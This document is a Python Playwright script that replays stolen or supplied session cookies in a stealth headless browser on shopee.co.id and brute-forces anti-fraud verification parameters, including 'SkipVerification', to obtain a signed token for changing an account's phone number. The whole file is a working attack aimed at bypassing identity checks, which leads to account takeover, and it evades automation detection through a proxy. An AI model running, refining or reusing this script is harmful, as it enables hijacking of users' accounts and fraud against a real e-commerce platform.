"""tv_schema_hunt.py — brute method_name DARI BROWSER (header asli)."""
import json, sys, time
from playwright.sync_api import sync_playwright

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_1553.txt"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
PROXY = "http://127.0.0.1:18080"

ck = open(CK).read().strip()
cookies = []
for p in ck.split(";"):
    if "=" in p:
        k, v = p.strip().split("=", 1)
        cookies.append({"name": k, "value": v, "domain": ".shopee.co.id", "path": "/"})

JS = r"""
async () => {
  const M='/api/v4/account/management', IVS='/api/v4/anti_fraud/ivs';
  const post = async (p,b) => {
    const r = await fetch(p,{method:'POST',credentials:'include',
      headers:{'Content-Type':'application/json','X-API-SOURCE':'pc',
               'X-Requested-With':'XMLHttpRequest','Accept':'application/json',
               'X-Shopee-Language':'id'}, body:JSON.stringify(b||{})});
    let j=null; try{j=await r.json();}catch(e){}
    return {s:r.status,e:j&&j.error,d:j&&j.data};
  };
  const o={};
  let r = await post(M+'/change_phone_init',{});
  o.auth=(r.d||{}).auth_required;
  r = await post(M+'/change_phone_init_v2',{});
  const UT=(r.d||{}).ivs_utoken||'', CPT=(r.d||{}).change_phone_token||'';
  o.ut=UT.length; o.cpt=CPT.length;
  r = await post(IVS+'/methods',{event:2,u_token:UT});
  const ms = Array.isArray(r.d)?r.d:((r.d||{}).methods||[]);
  o.methods = ms.map(x=>({t:x.type,vt:(x.v_token||'').length,keys:Object.keys(x)}));
  o.sel = {};
  o.tv = {};
  // brute method_name variants per method type
  for (const m of ms) {
    const mt=m.type, VT=m.v_token||'';
    const sel = await post(IVS+'/method/select',{v_token:VT,method:mt,event:2,u_token:UT});
    o.sel[mt] = {e:sel.e,d:sel.d};
    const names = ["Password","OTP","NewShopeePayPin","ShopeePay","DEVICE_TOKEN",
                   "SkipVerification", String(mt), mt];
    o.tv[mt] = [];
    for (const nm of names) {
      const r2 = await post(IVS+'/token/verify',{
        method_name:nm, event:2, u_token:UT, r_token:VT, v_token:VT,
        shopee_df:'', misc:{seed:'',operation:0}});
      o.tv[mt].push({nm:String(nm), e:r2.e,
                     sig: r2.d&&r2.d.signature?r2.d.signature.length:0});
      if (r2.e===0 && r2.d && r2.d.signature) {
        o.HIT = {nm:String(nm), mt:mt, sig:r2.d.signature};
        return o;
      }
    }
  }
  return o;
}
"""

with sync_playwright() as pw:
    br = pw.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-dev-shm-usage", "--window-size=1366,1000",
        "--disable-blink-features=AutomationControlled"])
    ctx = br.new_context(user_agent=UA, locale="id-ID",
                         viewport={"width": 1366, "height": 1000},
                         timezone_id="Asia/Jakarta", proxy={"server": PROXY})
    ctx.add_cookies(cookies)
    pg = ctx.new_page()
    pg.goto("https://shopee.co.id/", wait_until="domcontentloaded", timeout=90000)
    pg.wait_for_timeout(14000)
    print("=== brute schema dari browser ===", flush=True)
    try:
        o = pg.evaluate(JS)
    except Exception as e:
        print("ERR", str(e)[:150])
        o = {}
    print(f"\nauth={o.get('auth')} ut={o.get('ut')}B cpt={o.get('cpt')}B")
    print(f"methods={o.get('methods')}")
    for mt, lst in (o.get("tv") or {}).items():
        print(f"\n--- type {mt} select={str((o.get('sel') or {}).get(str(mt)) or (o.get('sel') or {}).get(int(mt)))[:90]}")
        for x in lst:
            print(f"    {str(x['nm']):20s} err={x['e']} sig={x['sig']}")
    if o.get("HIT"):
        print(f"\n🟢🟢 HIT! method_name={o['HIT']['nm']} sig={len(o['HIT']['sig'])}B")
        json.dump(o["HIT"], open("tv_hit.json", "w"))
    json.dump(o, open("tv_hunt.json", "w"), indent=1)
    br.close()
